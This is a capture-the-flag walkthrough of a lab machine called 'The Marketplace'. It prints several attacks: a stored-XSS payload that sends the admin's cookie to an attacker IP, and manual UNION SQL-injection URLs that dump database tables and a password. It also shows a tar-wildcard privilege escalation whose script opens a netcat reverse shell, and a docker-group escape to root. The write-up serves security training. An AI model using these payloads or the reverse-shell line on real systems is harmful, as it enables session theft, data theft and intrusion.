# The Marketplace

### The Marketplace
First create an account on the webpage (`test:test`), next step is to exploit a stored XSS vulnerability to steal michael's (the admin) cookie. The payload I used for XSS is `<script>new Image().src="http://10.11.127.156/steal.php?cookie=" + document.cookie;</script>`, if I open a python webserver on port 80 I get my own cookie. 
Luckily there's a button that allows me to report the listing to an admin, to make sure that his browser will view the XSS.<br />
![image](https://github.com/user-attachments/assets/8995c8e8-ec3c-4da0-b2fc-59ab16d5227d)<br />
So I report the listing and get the admin token on my webserver! The next step is to put it in the `cookie` variable from the developer's tools:<br />
![image](https://github.com/user-attachments/assets/5f76a337-1fb5-4c8e-9c44-baad24d55b4f)<br />
And now I have access to the `/admin` panel and got the first flag:<br />
![image](https://github.com/user-attachments/assets/4d42d3c0-14ca-4f8f-ad9a-eef41e8c8612)<br />
Now I need to get foothold on the machine. In the admin panel, I can select the "profile" of a user, and the URL becomes, for example, `/admin?user=1`. If I try to perform some SQL injection, I get this error: <br />
![image](https://github.com/user-attachments/assets/c53068ec-cd09-4f2e-b39f-6d4802b06d51)<br />
SQLMAP doesn't work, probably because there's some WAF that periodically changes michael's cookie. I need to exploit this SQL injection manually. First of all I need to know the number of columns of the table this query is about. After some enumeration the number of columns is `4`, because the payload that doesn't trigger an error is `?user=0 union select 1,2,3,4 -- -`:<br />
![Screenshot 2025-04-10 130639](https://github.com/user-attachments/assets/b250b695-0529-4b38-833b-a39a6eea8abf)<br />
The user `0` doesn't exist, so it should give an error, however it doesn't because it returns the output of the second select we injected. The fact that this second select doesn't trigger any error means that the number of columns is exactly 4, and the web app was wrongly developed to show the output of the query, no metter what query. Now, how can I exploit this to get more information? I can use the table `information_schema`. This is a table that contains information about databases saved in this DB. To get the name of the other database besides `information_schema`, I used the following payload

    http://10.10.2.204/admin?user=0%20union%20select%20schema_name,schema_name,3,4%20from%20information_schema.schemata%20WHERE%20schema_name%20!=%20%27information_schema%27--%20-

![image](https://github.com/user-attachments/assets/72936a1b-2721-41a1-9d28-0fa58ee91be2)<br />
So now I know that the DB is called `marketplace`. Now I want to know what tables are in this database, to do that I'll use the following payload: 

    10.10.2.204/admin?user=0 UNION SELECT table_name, table_name, null, null FROM information_schema.tables WHERE table_schema = 'marketplace' LIMIT 1 OFFSET 0-- -
This will print the first table only:<br />
![image](https://github.com/user-attachments/assets/de96fc29-46b6-40b8-a1f3-2ee235ced79d)<br />
So one table is `items`. Let's find another table:

    http://10.10.2.204/admin?user=0%20UNION%20SELECT%20table_name,%20table_name,%20null,%20null%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27%20LIMIT%201%20OFFSET%201--%20-
The offset is now 1, and I get a different table name: <br />
![image](https://github.com/user-attachments/assets/7186b438-c1f6-49c0-9935-55f293da9b6c)<br />
So the second table is `messages`. I keep doing this just incrementing the offset and find also the table `users`.
Now I want to drop the contents of the tables. For example I'll take the table `messages`. I need to first find the names of the columns, and I'll use a similar technique as before, using LIMIT and OFFSET: <br />

    http://10.10.2.204/admin?user=0%20UNION%20SELECT%20column_name,%20null,%20null,%20null%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27messages%27%20AND%20table_schema%20=%20%27marketplace%27%20LIMIT%201%20OFFSET%202--%20-
![image](https://github.com/user-attachments/assets/caf30a59-e011-44ff-8d59-6c3a5d57d59f)<br />
By using this payload and just changing the offset, I find the following column names: `user_from`, `user_to`, `message_content`, `is_read`, `id`. Finally, the following payload shows all the `message_content`s in the DB, and I find a password: 

    http://10.10.2.204/admin?user=0%20UNION%20SELECT%20NULL,%20message_content,%20NULL,%20NULL%20FROM%20messages%20--
![image](https://github.com/user-attachments/assets/101a956e-2237-47e0-b78a-e2cf14fed096)<br />
Now I can log into jake's ssh account and get the first flag.
Now if I run `sudo -l` I get this: <br />
![image](https://github.com/user-attachments/assets/b05f403e-9d07-4c9f-a6d1-98cc8cbec752)<br />
Also, there are three users with a bash shell:<br />
![Screenshot 2025-04-11 103648](https://github.com/user-attachments/assets/38e112e6-5ccb-42cc-858b-3f5df82d3dce)<br />
And these are the groups they belong to:<br />
![Screenshot 2025-04-11 103805](https://github.com/user-attachments/assets/9d1c3931-6b22-45ca-8275-f4a06648967a)<br />
So I believe that I need to become the user `marketplace`, because it belongs to the group `sudo`. Here's how to spawn a shell as michael:<br />
![image](https://github.com/user-attachments/assets/57f06e33-ffa9-44c6-8ef3-ace646141a0c)<br />
I am exploiting `tar`'s wildcards, which are basically files that tar executes when it sees them. [This website](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa) explains this attack very well. To exploit it, go inside `/opt/backups` and run the following commands:

    echo "" > '--checkpoint=1'
    echo "" > '--checkpoint-action=exec=sh privesc.sh'
    nano privesc.sh
Inside the `privesc.sh` file I put the following code: 

    #!/bin/bash
    busybox nc 10.11.127.156 9001 -e sh
Now I'm michael, let's see what I can do. I run `linpeas` and it finds this:<br />
![image](https://github.com/user-attachments/assets/acf4f1bf-c675-4fb2-a58b-69c7868a126a)<br />
I belong to the `docker` group. Users in the docker group can execute the `docker` command, which uses the `docker daemon`, which always has root privileges. The exploit that uses docker privileges can be easily found on [gtfobins](https://gtfobins.github.io/gtfobins/docker/#sudo), just run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` and become root!:<br />
![image](https://github.com/user-attachments/assets/140b33d7-985f-43bb-b271-734dea79453e)<br />





